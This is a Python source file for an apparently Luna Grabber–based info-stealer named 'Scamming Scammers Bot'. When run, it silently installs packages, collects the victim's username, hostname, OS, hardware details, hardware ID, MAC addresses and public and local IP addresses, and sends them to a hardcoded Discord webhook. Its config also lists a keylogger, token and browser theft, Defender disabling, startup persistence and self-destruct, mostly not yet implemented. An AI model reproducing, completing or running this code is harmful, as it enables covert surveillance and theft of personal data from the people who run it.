import socket
import platform
import subprocess
import psutil
import GPUtil
import uuid
import os
import re
import requests
import sys
import wmi
import tkinter as tk
def ensure_pip():
    try:
        import pip
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'ensurepip', '--upgrade'])

def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        ensure_pip()  # Ensure pip is available
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', module_name])

def install_required_modules():
    required_modules = [
        "socket",
        "platform",
        "subprocess",
        "psutil",
        "GPUtil",
        "uuid",
        "os",
        "re",
        "requests",
        "sys",
        "wmi",
    ]
    for module in required_modules:
        install_module(module)

# Install required modules
install_required_modules()

filler = "Hello World"

BUILDERVALUES = {
    "webhook": "https://discord.com/api/webhooks/1203454250001240095/PvZ2U0RhgT_KHRB-TZTv1qcXdwTPYFgvlG8VabGgYahm3OsmkeaKWLj1h7h3g35qK4a8",
    "botname": "Scamming Scammers Bot",
    "ping": True,
    "pingtype": "Everyone",
    "startup": True,
    "defender": True,
    "systeminfo": True,
    "browser": True,
    "roblox": True,
    "obfuscation": True,
    "minecraft": True,
    "wifi": True,
    "discord": True,
    "self_destruct": True,
    "clipboard": True,
    "backupcodes": True,
    "keylogger": True,
    "icon": "https://cdn.discordapp.com/attachments/1141547949810257921/1204294384552517682/standard.gif?ex=65d4358b&is=65c1c08b&hm=984e3cac303359287b9f1c3c14ff2a1188e32f3973ceed6e890b362e21f4e251&",
    "gps": True,
}

def main():
    data = {
        "username": str(BUILDERVALUES["botname"]),
        "avatar_url": str(BUILDERVALUES["icon"])
    }
    if BUILDERVALUES["ping"] == True:
        if not BUILDERVALUES["pingtype"] == "None":
            content = f"@{BUILDERVALUES['pingtype'].lower()}"
            BUILDERVALUES["pingtype"] = content
    if BUILDERVALUES["systeminfo"] == True:
        systeminfo()
    if BUILDERVALUES["discord"]:
        print("Not built yet")

def systeminfo():
        systeminfoarray = {
            "computer_os": f"{platform.system()} {platform.release()} {('Pro' if platform.system() == 'Windows' and 'professional' in platform.win32_edition().lower() else platform.win32_edition().capitalize()) if platform.system() == 'Windows' else ''}, {platform.platform()}".strip(', '),
            "cpu": f"{platform.processor().split(' ', 1)[0]}" + f", " + f"{platform.processor()}",
            "gpu": (open("/proc/driver/nvidia/gpus/0/information").read().split(":")[-1].strip() if platform.system() == "Linux" else [gpu.Name for gpu in wmi.WMI().Win32_VideoController()][0] if platform.system() == "Windows" else " ".join([i for i in platform.mac_ver()[0].split(".") if i.isdigit()]) if platform.system() == "Darwin" else "Unknown"),
            "ram": f"{round(psutil.virtual_memory().total / (1024 ** 3))}GB, {psutil.virtual_memory().total}",
            "username": str(os.getenv("UserName")),
            "hostname": str(socket.gethostname()),
            "hwid": f'{"-".join(["{:02x}".format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)])}, "{str(uuid.UUID(int=uuid.getnode()))} (Other version)"',
            "ip": f"{requests.get('https://api.ipify.org?format=json').json()['ip']}, {(lambda s: s.connect(('8.8.8.8', 80)) or s.getsockname()[0])(socket.socket(socket.AF_INET, socket.SOCK_DGRAM))}",
            "mac": ', '.join([f"{interface.replace('*', '')}: {addr.address}" for interface, addrs in psutil.net_if_addrs().items() for addr in addrs if addr.family == psutil.AF_LINK]),
        }
        data = {
            "embeds": [
                {
                    "title": BUILDERVALUES["botname"],
                    "color": 5639644,
                    "fields": [
                        {
                            "name": "System Info",
                             "value": f'''💻 **PC Username:** `{systeminfoarray["username"]}`\n:desktop: **PC Name:** `{systeminfoarray["hostname"]}`\n🌐 **OS:** `{systeminfoarray["computer_os"]}`\n\n👀 **IP:** `{systeminfoarray["ip"]}`\n🍏 **MAC:** `{systeminfoarray["mac"]}`\n🔧 **HWID:** `{systeminfoarray["hwid"]}`\n\n<:cpu:1051512676947349525> **CPU:** `{systeminfoarray["cpu"]}`\n<:gpu:1051512654591688815> **GPU:** `{systeminfoarray["gpu"]}`\n<:ram1:1051518404181368972> **RAM:** `{systeminfoarray["ram"]}GB`'''
                        }
                    ],
                    "footer": {
                        "text": "Scamming Scammers | Created By Plazaify, Based of of Luna Grabber (Made by smug)"
                    },
                    "thumbnail": {
                        "url": BUILDERVALUES["icon"]
                    }
                }
            ],
            "username": BUILDERVALUES["botname"],
            "avatar_url": BUILDERVALUES["icon"]
        }
        pingtypemessage = {
    'content': f'Ping Type: {BUILDERVALUES["pingtype"]}'
        }
        requests.post(BUILDERVALUES["webhook"], json=pingtypemessage)
        requests.post(BUILDERVALUES["webhook"], json=data)
main()

